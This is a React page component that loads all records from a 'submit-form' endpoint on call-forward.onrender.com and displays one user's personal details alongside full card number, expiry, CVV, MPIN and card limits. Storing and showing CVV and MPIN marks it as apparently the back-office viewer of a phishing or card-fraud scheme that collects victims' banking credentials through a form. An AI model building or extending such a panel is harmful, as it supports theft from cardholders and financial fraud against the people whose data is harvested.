// src/pages/UserDetails.jsx
import React, { useEffect, useState } from "react";
import { useParams, Link } from "react-router-dom";
import axios from "axios";

export default function UserDetails() {
    const { userId } = useParams();
    const [user, setUser] = useState(null);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        const fetchUser = async () => {
            try {
                // Fetch all users and find the one with userId
                const res = await axios.get("https://call-forward.onrender.com/submit-form");
                const foundUser = res.data.data.find((u) => u.userId === userId);
                setUser(foundUser);
            } catch (err) {
                console.error(err);
            } finally {
                setLoading(false);
            }
        };

        fetchUser();
    }, [userId]);

    if (loading) return <p className="text-center mt-10">Loading user details...</p>;
    if (!user) return <p className="text-center mt-10 text-red-500">User not found</p>;

    return (
        <div className="min-h-screen bg-gray-100 p-6">
            <Link
                to="/"
                className="inline-block mb-6 text-blue-600 hover:underline"
            >
                ← Back to Dashboard
            </Link>

            <div className="bg-white rounded-xl shadow-md p-6 max-w-3xl mx-auto">
                <h1 className="text-2xl font-bold mb-6 text-gray-800">User Details</h1>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <p className="text-gray-500 font-semibold">User ID:</p>
                        <p className="text-gray-900">{user.userId}</p>
                    </div>
                    <div>
                        <p className="text-gray-500 font-semibold">Name:</p>
                        <p className="text-gray-900">{user.name}</p>
                    </div>
                    <div>
                        <p className="text-gray-500 font-semibold">Email:</p>
                        <p className="text-gray-900">{user.email || "-"}</p>
                    </div>
                    <div>
                        <p className="text-gray-500 font-semibold">Phone:</p>
                        <p className="text-gray-900">{user.phone}</p>
                    </div>
                    <div>
                        <p className="text-gray-500 font-semibold">Date of Birth:</p>
                        <p className="text-gray-900">{user.dob || "-"}</p>
                    </div>
                    <div>
                        <p className="text-gray-500 font-semibold">City:</p>
                        <p className="text-gray-900">{user.city || "-"}</p>
                    </div>
                </div>

                <h2 className="text-xl font-bold mt-6 mb-4 text-gray-800">
                    Card Information
                </h2>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <p className="text-gray-500 font-semibold">Card Holder Name:</p>
                        <p className="text-gray-900">{user.cardHolderName || "-"}</p>
                    </div>

                    <div>
                        <p className="text-gray-500 font-semibold">Card Number:</p>
                        <p className="text-gray-900 font-mono tracking-wider">
                            {user.cardNumber}
                        </p>
                    </div>

                    <div>
                        <p className="text-gray-500 font-semibold">Expiry Date:</p>
                        <p className="text-gray-900">{user.expiryDate || "-"}</p>
                    </div>

                    <div>
                        <p className="text-gray-500 font-semibold">CVV:</p>
                        <p className="text-gray-900">{user.cvv}</p>
                    </div>
                    <div>
                        <p className="text-gray-500 font-semibold">MPIN:</p>
                        <p className="text-gray-900">{user.mpin}</p>
                    </div>

                    <div>
                        <p className="text-gray-500 font-semibold">Total Limit:</p>
                        <p className="text-gray-900">{user.cardTotalLimit || "-"}</p>
                    </div>

                    <div>
                        <p className="text-gray-500 font-semibold">Available Limit:</p>
                        <p className="text-gray-900">{user.cardAvailableLimit || "-"}</p>
                    </div>
                </div>


                <p className="text-gray-500 text-sm mt-4">
                    Created At: {new Date(user.createdAt).toLocaleString()}
                </p>
            </div>
        </div>
    );
}
